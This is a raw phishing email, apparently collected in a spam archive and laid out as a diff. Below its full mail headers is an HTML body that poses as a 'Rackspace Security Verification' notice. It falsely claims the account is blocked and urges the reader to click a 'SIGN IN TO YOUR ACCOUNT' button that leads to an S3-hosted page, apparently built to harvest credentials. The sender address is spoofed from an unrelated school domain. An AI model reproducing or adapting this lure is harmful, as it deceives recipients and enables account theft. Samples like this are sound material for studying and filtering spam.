@@ -1,0 +1,107 @@
+Return-Path: <mail-214072057285612info@collegesaintjoseph.be>
+Delivered-To: untroubl8492-bruce@untroubled.org
+Received: (qmail 1994001 invoked from network); 6 Jan 2024 00:34:19 -0000
+Received: from mail-oo1-xc65.google.com (mail-oo1-xc65.google.com [IPv6:2607:f8b0:4864:20::c65])
+  by vx0.untroubled.org ([IPv6:2001:19f0:5c01:c6b::100])
+  with ESMTP via TCP6; 06 Jan 2024 00:34:19 -0000
+Received: by mail-oo1-xc65.google.com with SMTP id 006d021491bc7-5963eaf7460so81292eaf.3
+        for <bruce@untroubled.org>; Fri, 05 Jan 2024 16:34:19 -0800 (PST)
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=collegesaintjoseph.be; s=google; t=1704501258; x=1705106058; darn=untroubled.org;
+        h=content-transfer-encoding:mime-version:subject:message-id:to:from
+         :date:from:to:cc:subject:date:message-id:reply-to;
+        bh=ZMzKtQnDyyXiG8iOQ/4fshLp97PziJQ0aSGIcSYjL74=;
+        b=QvUITmRPvJYF9U/RUdl+typxhFHXuFfUW8HzftSQe2Ygtl5oshAH5CPdUZqDU/Djay
+         ENKw+wI1l78fBpjbAtqrqQP63/F1cv9KTWatsPLEnkVhwqCllqEkUpoRvlyMBCpUmP7C
+         eHYLO5YB3eIIIm8/2T1NZTvvkClk7TxSW8SDw=
+X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
+        d=1e100.net; s=20230601; t=1704501258; x=1705106058;
+        h=content-transfer-encoding:mime-version:subject:message-id:to:from
+         :date:x-gm-message-state:from:to:cc:subject:date:message-id:reply-to;
+        bh=ZMzKtQnDyyXiG8iOQ/4fshLp97PziJQ0aSGIcSYjL74=;
+        b=wtLFqZqqaHU3TDOIQPXJMz/582SJRRP+1n+DCjLA0OW2LbBI43VdSg778HNy8J3PMf
+         Ngw42WqC2J9D2jv5ob7EtH1lxRY/AAAu1xUZKU7ZBfAUcS6p0ZZMhsUJR6phC7QPzacL
+         8wTvCeUso39M8lrnF4LdR+OC+gA1iZyyjaqwPVPcGKLFUYTH1XSE76f46rofSaLZ+Pu1
+         h2HPvemaf+Lq5OcbUXHw5KQHzzhcoiIFXG6tH6v/xxZDCjIAVT0gPHHCv9phScgRXqpk
+         BG1tmRClNmIGSOLE2TnCIdHNRjANbHQryRPD1aq/9O74RaQpPhr7Vf2PV/A0AIXJHEiO
+         wgAQ==
+X-Gm-Message-State: AOJu0YxrtGvd44cgwAl6eL64LAgN9XHUoIXaCUhYO6dF4EnDI5vBXuhJ
+	SST4Q6Psif5Yn3/k7J0QfaKyxCaKSpp/ld5U7z752PEcszL4WR74Au9OUkNWIYT3h4DI
+X-Google-Smtp-Source: AGHT+IE4NI+1EiR088vXTK4MQ/fDDsOD/CmLbQylRydvaJb/FL8dEE0ttatOk7hJEcclu1UF1UICabNqtcpd
+X-Received: by 2002:a05:6358:60c9:b0:175:7c1b:67f6 with SMTP id i9-20020a05635860c900b001757c1b67f6mr352200rwi.21.1704501258510;
+        Fri, 05 Jan 2024 16:34:18 -0800 (PST)
+Return-Path: <mail-214072057285612info@collegesaintjoseph.be>
+Received: from kmm-o04 ([152.67.47.173])
+        by smtp-relay.gmail.com with ESMTPS id s16-20020a17090a5d1000b0028be9902464sm115232pji.14.2024.01.05.16.34.17
+        for <bruce@untroubled.org>
+        (version=TLS1 cipher=AES128-SHA bits=128/128);
+        Fri, 05 Jan 2024 16:34:18 -0800 (PST)
+X-Relaying-Domain: collegesaintjoseph.be
+Date: Fri, 5 Jan 2024 21:34:17 -0300 (GMT-03:00)
+From: -=?UTF-8?B?UmFja3NwYWNlKFRlYW0p?= <mail-214072057285612info@collegesaintjoseph.be>
+To: bruce@untroubled.org
+Message-ID: <861263.126156.1704501257820.JavaMail.www@kmm-o04>
+Subject: Update 61745612704847
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Mailer: ColdFusion 9 Application Server
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="UTF-8" />
+	<meta content="IE=edge" http-equiv="X-UA-Compatible" />
+	<meta content="width=device-width, initial-scale=1.0" name="viewport" />
+	<title>Rackspace Security Verification</title>
+	<style type="text/css">body {
+            font-family: 'Arial', sans-serif;
+            background-color: #f4f4f4;
+            color: #333;
+            margin: 20px;
+            text-align: center;
+        }
+
+        .container {
+            max-width: 600px;
+            margin: 0 auto;
+        }
+
+        h1 {
+            color: #0066cc;
+        }
+
+        p {
+            font-size: 1.1em;
+            line-height: 1.6;
+            margin-bottom: 20px;
+        }
+
+        .cta-button {
+            display: inline-block;
+            padding: 10px 20px;
+            margin-top: 20px;
+            background-color: #eb0000;
+            color: #fff;
+            text-decoration: none;
+            border-radius: 5px;
+        }
+
+        .cta-button:hover {
+            background-color: #c10000;
+        }
+	</style>
+</head>
+<body>
+<div class="container">
+<h1><span style="color:#000000;">Rackspace Security Verification</span></h1>
+
+<p>We recently added a new security verification for all Rackspace accounts. We require our customers to check and update their account information. You will not be able to use your Rackspace account until this process is complete.</p>
+
+<p>Please click on the link below to proceed:</p>
+<a class="cta-button" href="https://jockoosde.s3.eu-north-1.amazonaws.com/skklz.html?sopc=61745612704847" target="_blank">SIGN IN TO YOUR ACCOUNT</a>
+
+<p>&nbsp;</p>
+</div>
+</body>
+</html>
